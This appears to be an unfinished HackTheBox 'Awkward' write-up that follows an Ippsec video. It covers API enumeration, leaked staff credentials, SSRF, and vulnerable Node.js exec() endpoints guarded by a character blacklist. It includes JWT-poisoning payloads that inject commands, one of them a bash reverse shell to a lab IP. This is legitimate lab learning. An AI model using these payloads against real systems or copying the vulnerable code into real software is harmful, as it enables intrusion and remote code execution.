# Awkward Helped-Through

Name: Awkward
Date:  
Difficulty:  Medium
Goals: 
- Get over COVID soon and still do something
- Learn API hacking Methodology 
Learnt:
- JavaScript skips conditional operator if what is passed is null. 
- I need to learn some JavaScript 
Beyond Root:
- Do a hour on the prototype of Archive API - done just ended up being lots of questions and too much design for the time being, but nice to check up on it  
- InsiderPHD 
- [THM Bookstore](https://tryhackme.com/room/bookstoreoc) 

- [[Awkward-Notes.md]]
- [[Awkward-CMD-by-CMDs.md]]

[Ippsec Awkward Video](https://www.youtube.com/watch?v=gmaizI5Xcqs)

## Recon

The time to live(6) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

Directs us `hat-valley.htb`, but not redirected.
![](hatvalleyhtb.png)

![](storefromffuf.png)

![](storeauth.png)
- Lesson (re?)Learnt:
	- If index.php is locked down on login prompt, try other of the same extension to check were the gaps in what is being maintained as authentication

#### Sidenotes: WebPacks

[Wikipedia - Webpack](https://en.wikipedia.org/wiki/Webpack) are: *"is free and open-source module bundler for JavaScript but it can transform front-end assets such as HTML, CSS, and images if the corresponding loaders are included. Webpack takes modules with dependencies and generates static assets representing those modules. ...[Node.js](https://en.wikipedia.org/wiki/Node.js "Node.js") is required to use Webpack...Webpack provides [code on demand](https://en.wikipedia.org/wiki/Code_on_demand "Code on demand") using the moniker 'code splitting'."* 

[Snyk](https://snyk.io/node-js/webpack): *"Packs CommonJs/AMD modules for the browser. Allows to split your codebase into multiple bundles, which can be loaded on demand. Support loaders to preprocess files, i.e. json, jsx, es7, css, less, ... and your custom stuff."*


[CWE-540](https://cwe.mitre.org/data/definitions/540.html) - Inclusion of Sensitive Information in Source Code

[rarecoil Medium Article cites CWE-540](https://medium.com/@rarecoil/spa-source-code-recovery-by-un-webpacking-source-maps-ef830fc2351d)
- Learnt never buy into the hype and circle-*hugging* around a topic you are too invested in 
- The benefits of source maps in production boil down to these two things:
	 1. It might help you track down bugs in production more easily  
	 2. It helps other people learn from your website more easily
- > is blockquoting for markdown
- https://github.com/rarecoil/unwebpack-sourcemap seems cool

This is a weird web application were client side is loading a lot the middle-backend code
![](routersonthewebclient.png)

```bash
cat router.js| grep path | awk -F\" '{print $2}' > routes.txt
```

dashboard -> hr and hr is just hr.
![](checkoutthehrlogin.png)



- API Hacking:
	- Routes - router contains some routes
		- Find routes, test routes by **always** viewing the route - regardless of authentication level
	- Services



![](learnapiservices.png)


![](tryingtogetintoapis.png)

![](thegatewaytimeout.png)

![](checkeverything.png)

![](staffdetails-x.png)

![](staffdetails-0.png)

![](questionmarkuserequals0.png)

![](beanintheapi.png)

- `/ID` -> `/1` 
- `?$param=ID` -> `?user=0` or `?product=hatID$hash` 
- Another route `api/user/location` with more routes or ...

Do not forget the other places that data can be modified.
![](anothercookie.png)

Curl one list of passwords out
![](curlsetnocookie.png)

![](jqdisplayshowoff.png)

A remove cookie and it somehow authenticates 

[OMIGOD Vulnerability Article](https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure)

The API is using the same authentication code rather than a decorator

JavaScript skips conditional operator if what is passed is null. Utter madness.
![](javascriptisverybad.png)
One the links to one of the referenced articles suggest that JavaScript is the Assembly Language of the Web, which 2013 after Myspace XSS Sammie exploit. I understand that someone well if we checked everything then the web pages would always be broken...and then I remember that it is still broken even if it does load in another amazingly horrible way. I have bias, but I love the horror of JavaScript.

JQ not total memorized yet
![](sadme1.png)
...
![](sadme2.png)
Not had to deal with just arrays I think
![](thatiswhatwanted.png)

```bash
cat staff-details.json | jq '.[] | "\(.username):\(.password)"'
# Remove quotes
cat staff-details.json | jq -r '.[] | "\(.username):\(.password)"'
```

![](ippsecisJustQoolASF.png)

Shannon Entropy test
![](cyberchefshannonentropy.png)

Ippsec maybe feels out is SHA256 or know length, but I forget to think of that:
```bash
echo -n $hash | wc -l 

echo -n  |shasum -a $ALG
```
![](crackstation.png)

![](hashlengthtest.png)
Line break account for one of the characters
![](onebecauseoflinebreak.png)

Christopher Jones cannot login here:
![](christ123no.png)
The response to trying to:
![](nochristjonesonthelogin.png)

But for `hat-valley.htb/hr` he can:
![](hichris.png)
Playing around with the JSON to always check what responses we get from incorrect password and correct username..
![](validusertimings.png)
.. and from incorrect password and incorrect username
![](54to66.png)

This is another vulnerability - does not require cookie from the refresh button.
![](potentialbruteforceparam.png)

Bash reminders on treating a output of a command as a file
```bash
# Treat as a file
<( seq 0 65535)
```

#### Taking a break..Break in my understanding of APIs with Insider PHD Playlist and making improving a prototype of my own from a couple of years ago

[To learn APIs and Golang I followed along with video](https://www.youtube.com/watch?v=2v11Ym6Ct9Q) and [repository is here](https://github.com/kubucation/go-rollercoaster-api)

From [THM API 1](https://tryhackme.com/room/owaspapisecuritytop105w) and [THM API 2](https://tryhackme.com/room/owaspapisecuritytop10d0) and reading OWASP I made [API-Hacking](https://github.com/7RU7H/Archive/blob/main/Development/APIs/API-Hacking.md) as start before potential fleshing out a file per vulnerability as I have done with others. 
Watched [Top 10 API Bugs and where to find them](https://www.youtube.com/watch?v=aQGbYfalRTA)

[And got side tracked by this!](https://tryhackme.com/room/looneytunes) - The ld.so dynamic loader for most modern Linux -  [qualys](https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt). I mostly know the contents of [API Recon](https://www.youtube.com/watch?v=fvcKwUS4PTE&list=PLbyncTkpno5HqX1h2MnV6Qt4wvTb8Mpol&index=4), but checked out [Arjun - Github](https://github.com/s0md3v/Arjun) and [Kali tools: Arjun](https://www.kali.org/tools/arjun/), which I will test more but it did not find the parameter for store-status for some reason. 

![](arjuntesting.png)

Attempting SSRF, but Ippsec points out the lack of Cookie vulnerability - 
![](nossrfbutcookievuln.png)

SSRF
![](ssrfafterIforthequotes.png)

`ffuf` send to a proxy like `proxychains` or `burpsuite`
```bash
-x $proxyIP:$port 
```



Localhost SSRF Fuzzing the ports to find 80,3002
![](ssrfthelocalhost.png)

Looking through the source
![](apiloginon3002.png)

And getting a much better look in the browser
![](hatvalleyapi.png)

Ippsec recommend watching Backend
- Fuzzing API get difficult to enumerate based off the pass always fuzz different methods
	- Change Method in BurpSuite from Repeater tab: `Right Click -> Change request method`

![](optionson3002test.png)

#### The Source code from the documentation

/api/login
```js
app.post('/api/login', (req, res) => {
	const {username, password} = req.body;
	connection.query('SELECT * FROM users WHERE username = ? AND password = ?', [
		username,
		sha256(password)
	], function (err, results) {
		if (err) {
			return res.status(401).send('Incorrect username or password');
		} else {
			if (results.length !== 0) {
				const userForToken = { username: results[0].username };
				const firstName = username.split('.')[0][0].toUpperCase() + username.split('.')[0].slice(1).toLowerCase();
				const token = jwt.sign(userForToken, TOKEN_SECRET);
				const toReturn = {
					'name': firstName,
					'token': token
				};
				return res.status(200).json(toReturn);
			} else {
				return res.status(401).send('Incorrect username or password');
			}
		}
	});
});
```

/api/submit-leave
```js
app.post('/api/submit-leave', (req, res) => {
	const {reason, start, end} = req.body;
	const user_token = req.cookies.token;
	var authFailed = false;
	var user = null;
	if (user_token) {
		const decodedToken = jwt.verify(user_token, TOKEN_SECRET);
		if (!decodedToken.username) {
			authFailed = true;
		} else {
			user = decodedToken.username;
		}
	}
	if (authFailed) {
		return res.status(401).json({ Error: 'Invalid Token' });
	}
	if (!user) {
		return res.status(500).send('Invalid user');
	}
	const bad = [
		';',
		'&',
		'|',
		'>',
		'<',
		'*',
		'?',
		'`',
		'$',
		'(',
		')',
		'{',
		'}',
		'[',
		']',
		'!',
		'#'
	];
	const badInUser = bad.some(char => user.includes(char));
	const badInReason = bad.some(char => reason.includes(char));
	const badInStart = bad.some(char => start.includes(char));
	const badInEnd = bad.some(char => end.includes(char));
	if (badInUser || badInReason || badInStart || badInEnd) {
		return res.status(500).send('Bad character detected.');
	}
	const finalEntry = user + ',' + reason + ',' + start + ',' + end + ',Pending\r';
	exec(`echo "${ finalEntry }" >> /var/www/private/leave_requests.csv`, (error, stdout, stderr) => {
		if (error) {
			return res.status(500).send('Failed to add leave request');
		}
		return res.status(200).send('Successfully added new leave request');
	});
});
```

/api/all-leave
```js
app.get('/api/all-leave', (req, res) => {
	const user_token = req.cookies.token;
	var authFailed = false;
	var user = null;
	if (user_token) {
		const decodedToken = jwt.verify(user_token, TOKEN_SECRET);
		if (!decodedToken.username) {
			authFailed = true;
		} else {
			user = decodedToken.username;
		}
	}
	if (authFailed) {
		return res.status(401).json({ Error: 'Invalid Token' });
	}
	if (!user) {
		return res.status(500).send('Invalid user');
	}
	const bad = [
		';',
		'&',
		'|',
		'>',
		'<',
		'*',
		'?',
		'`',
		'$',
		'(',
		')',
		'{',
		'}',
		'[',
		']',
		'!',
		'#'
	];
	const badInUser = bad.some(char => user.includes(char));
	if (badInUser) {
		return res.status(500).send('Bad character detected.');
	}
	exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {
		encoding: 'binary',
		maxBuffer: 51200000
	}, (error, stdout, stderr) => {
		if (stdout) {
			return res.status(200).send(new Buffer(stdout, 'binary'));
		}
		if (error) {
			return res.status(500).send('Failed to retrieve leave requests');
		}
		if (stderr) {
			return res.status(500).send('Failed to retrieve leave requests');
		}
	});
});
```

Learning about holidays through APIs and AI.
![](learningaboutholidays.png)

/api/store-status
```js
app.get('/api/store-status', async (req, res) => {
	await axios.get(req.query.url.substring(1, req.query.url.length - 1)).then(http_res => {
		return res.status(200).send(http_res.data);
	}).catch(http_err => {
		return res.status(200).send(http_err.data);
	});
});
```

/api/staff-details
```js
app.get('/api/staff-details', (req, res) => {
	const user_token = req.cookies.token;
	var authFailed = false;
	if (user_token) {
		const decodedToken = jwt.verify(user_token, TOKEN_SECRET);
		if (!decodedToken.username) {
			authFailed = true;
		}
	}
	if (authFailed) {
		return res.status(401).json({ Error: 'Invalid Token' });
	}
	connection.query('SELECT * FROM users', function (err, results) {
		if (err) {
			return res.status(500).send('Database error');
		} else {
			return res.status(200).json(results);
		}
	});
});
```

- Parameterise SQL queries use ?
- [Use the binary protocol instead raw queries if possible](https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_binary_resultset.html)

I wanted to try these exec() before continuing to why Ippsec belined for the /api/all-leave
```js
exec(`echo "${ finalEntry }" >> /var/www/private/leave_requests.csv`, (error, stdout, stderr) => {
		if (error) {
			return res.status(500).send('Failed to add leave request');
		}
exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {
		encoding: 'binary',
		maxBuffer: 51200000
	}
```

Forget to recheck the blacklist then did and even newline did not work.
![](nonewlinecmdiuserforallleave.png)

Then realised, because I not try hard enough to read just experimenting without thinking again. Ippsec discusses poisoning the JWT
```js
	if (user_token) {
		const decodedToken = jwt.verify(user_token, TOKEN_SECRET);
		if (!decodedToken.username) {
			authFailed = true;
		} else {
			user = decodedToken.username;
		}
```
I pause to try for myself.

From memory JWT abusage attempt and thought
```js
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjk3ODk5NjM1fQ.wMjUJXUna2mguO4bplntTtgX0GD8DBx6UlRtpzqvwwI
// Each section is a base64 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
// {"alg":"HS256","typ":"JWT"}
.
eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjk3ODk5NjM1fQ
// invalid input fixed with appending ==
// {"username":"christopher.jones","iat":1697899635}
.
wMjUJXUna2mguO4bplntTtgX0GD8DBx6UlRtpzqvwwI
// %u'kiN`
//      zRTm
```

We only need to poison the username field
```bash
echo '{"username":"\nping -c 3 10.10.14.154","iat":1697899635}' | base64
# eyJ1c2VybmFtZSI6IgpwaW5nIC1jIDMgMTAuMTAuMTQuMTU0IiwiaWF0IjoxNjk3ODk5NjM1fQo
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IgpwaW5nIC1jIDMgMTAuMTAuMTQuMTU0IiwiaWF0IjoxNjk3ODk5NjM1fQo.wMjUJXUna2mguO4bplntTtgX0GD8DBx6UlRtpzqvwwI
```

I tried this for both all-leave and submit-leave returning nothing. The connection hanging
```bash
echo '{"username":"ping -c 3 10.10.14.154","iat":1697899635}' | base64
# eyJ1c2VybmFtZSI6InBpbmcgLWMgMyAxMC4xMC4xNC4xNTQiLCJpYXQiOjE2OTc4OTk2MzV9Cg
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InBpbmcgLWMgMyAxMC4xMC4xNC4xNTQiLCJpYXQiOjE2OTc4OTk2MzV9Cg.wMjUJXUna2mguO4bplntTtgX0GD8DBx6UlRtpzqvwwI
```

Just in case it is hanging, but still executing 
```bash
echo '{"username":"sh -i >& /dev/tcp/10.10.14.154/22 0>&1","iat":1697899635}' | base64 -w0
eyJ1c2VybmFtZSI6InNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE1NC8yMiAwPiYxIiwiaWF0IjoxNjk3ODk5NjM1fQo=

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE1NC8yMiAwPiYxIiwiaWF0IjoxNjk3ODk5NjM1fQo.wMjUJXUna2mguO4bplntTtgX0GD8DBx6UlRtpzqvwwI
```

Just in case the string substitution for all-leave can execute an inline  sub-shell - nope
```bash
echo '{"username":"$(ping -c 3 10.10.14.154)","iat":1697899635}' | base64 -w0
eyJ1c2VybmFtZSI6IiQocGluZyAtYyAzIDEwLjEwLjE0LjE1NCkiLCJpYXQiOjE2OTc4OTk2MzV9Cg==

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IiQocGluZyAtYyAzIDEwLjEwLjE0LjE1NCkiLCJpYXQiOjE2OTc4OTk2MzV9Cg.wMjUJXUna2mguO4bplntTtgX0GD8DBx6UlRtpzqvwwI
```

Return the write up. I am an idiot and got carried away with not considering the bad characters again. Ippsec explained something I did not know about `awk` that it can also be used like a `grep`, because of this we can inject based off of terminating the `'/` with a `'`.

```js
exec("awk '/" + user + "/' /var/www/private/leave_requests.csv" ...)
// becomes
exec("awk '/" + '' + "/' /var/www/private/leave_requests.csv" ...)
```

####  Self Improvement section

- Read idiot read
- Blacklist characters
- Question what it does at each step

Some solution is to this is prove it is not possible or possible 
```js
exec(`echo "${ finalEntry }" >> /var/www/private/leave_requests.csv`, ...)
```

Read the /api/submit-leave source code
```js
app.post('/api/submit-leave', (req, res) => {
	const {reason, start, end} = req.body;
	const user_token = req.cookies.token;
	var authFailed = false;
	var user = null;
	if (user_token) {
		const decodedToken = jwt.verify(user_token, TOKEN_SECRET);
		if (!decodedToken.username) {
			authFailed = true;
		} else {
			user = decodedToken.username;
		}
	}
	if (authFailed) {
		return res.status(401).json({ Error: 'Invalid Token' });
	}
	if (!user) {
		return res.status(500).send('Invalid user');
	}
	const bad = [
		';',
		'&',
		'|',
		'>',
		'<',
		'*',
		'?',
		'`',
		'$',
		'(',
		')',
		'{',
		'}',
		'[',
		']',
		'!',
		'#'
	];
	const badInUser = bad.some(char => user.includes(char));
	const badInReason = bad.some(char => reason.includes(char));
	const badInStart = bad.some(char => start.includes(char));
	const badInEnd = bad.some(char => end.includes(char));
	if (badInUser || badInReason || badInStart || badInEnd) {
		return res.status(500).send('Bad character detected.');
	}
	const finalEntry = user + ',' + reason + ',' + start + ',' + end + ',Pending\r';
	exec(`echo "${ finalEntry }" >> /var/www/private/leave_requests.csv`, (error, stdout, stderr) => {
		if (error) {
			return res.status(500).send('Failed to add leave request');
		}
		return res.status(200).send('Successfully added new leave request');
	});
});
```


```js
const {reason, start, end} = req.body;
... 
// each field will have been checked for bad characters with functions badIn...()
const finalEntry = user + ',' + reason + ',' + start + ',' + end + ',Pending\r';
exec(`echo "${ finalEntry }" >> /var/www/private/leave_requests.csv`, ...)	
```

Tested how newlines work and how they will not pass to then execute just to be throughout
```bash
echo hello \\n base64 -d \\n bash ''
```

```bash
',' 
# Would prevent segmenting and then concatenating a payload 
# By adding two '' at the end would avoid the prompt quote> for an additional quote

',Pending\r'
# This does not matter as we can't inject after it unless we somehow subsitituted with something like `sed` to then try to shell escape, but that would be somewhat redundant   

echo "${  ...}"
# We would have to encode  `}" | $command ` from a $base64 
```

No decode 
![](butredirect.png)

I also wanted check if there was escape sequence for `|`, `&` , `@`, etc.  [phind](https://www.phind.com) asking find to find all the bash escape sequences without have to break my brain trying to create a cheatsheet from escape characters. I looked for escape sequence for a pipe found none from reading manually. 
```bash
# Bash man page:
- `\a`: alert (bell)
- `\b`: backspace
- `\e`: an escape character
- `\f`: form feed or new page
- `\n`: newline
- `\r`: carriage return
- `\t`: horizontal tab
- `\v`: vertical tab
- `\\`: backslash
- `\'`: single quote
- `\"`: double quote
- `\nnn`: the eight-bit character whose value is the octal value nnn (one to three digits)
- `\xHH`: the eight-bit character whose value is the hexadecimal value HH (one or two hex digits)
- `\cx`: a control-x character [baeldung.com](https://www.baeldung.com/linux/bash-escape-characters)

Additionally, when used in a prompt string, some other escape sequences also have special meanings:

- `\d`: the date in "Weekday Month Date" format (e.g., "Tue May 26")
- `\D{format}`: the format is passed to strftime(3) and the result is inserted into the prompt string; an empty format results in a locale-specific time representation
- `\h`: the hostname up to the first ‘.’
- `\H`: the hostname
- `\j`: the number of jobs currently managed by the shell
- `\l`: the basename of the shell’s terminal device name
- `\n`: newline
- `\s`: the name of the shell, the basename of $0 (the portion following the final slash)
- `\t`: the current time in 24-hour HH:MM:SS format
- `\T`: the current time in 12-hour HH:MM:SS format
- `\@`: the current time in 12-hour am/pm format
- `\A`: the current time in 24-hour HH:MM format
- `\u`: the username of the current user
- `\v`: the version of Bash (e.g., 2.00)
- `\V`: the release of Bash, version + patch level (e.g., 2.00.0)
- `\w`: the current working directory, with $HOME abbreviated with a tilde
- `\W`: the basename of the current working directory, with $HOME abbreviated with a tilde
- `\!`: the history number of this command
- `\#`: the command number of this command
- `\$`: if the effective UID is 0, a #, otherwise a $
- `\nnn`: the character corresponding to the octal number nnn
- `\\`: a backslash
- `\[`: begin a sequence of non-printing characters, which could be used to embed a terminal control sequence into the prompt
- `\]`: end a sequence of non-printing characters [wiki.archlinux.org](https://wiki.archlinux.org/title/Bash/Prompt_customization)

Please note that the behavior of escape sequences may vary depending on your specific system and terminal settings. Always refer to the man pages (`man bash`) on your system for the most accurate information.
```

[Reread PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/#bypass-with-a-line-return). 

[13 minutes of progress over 4 and halfish hours](https://www.youtube.com/watch?v=gmaizI5Xcqs) and break later...


## Exploit


## Foothold

## Privilege Escalation

## Post Root Reflection  

## Beyond Root


[THM Bookstore](https://tryhackme.com/room/bookstoreoc) is a to do flesh out 

[Arjun section for a cheatsheet](https://www.youtube.com/watch?v=fvcKwUS4PTE&list=PLbyncTkpno5HqX1h2MnV6Qt4wvTb8Mpol&index=5)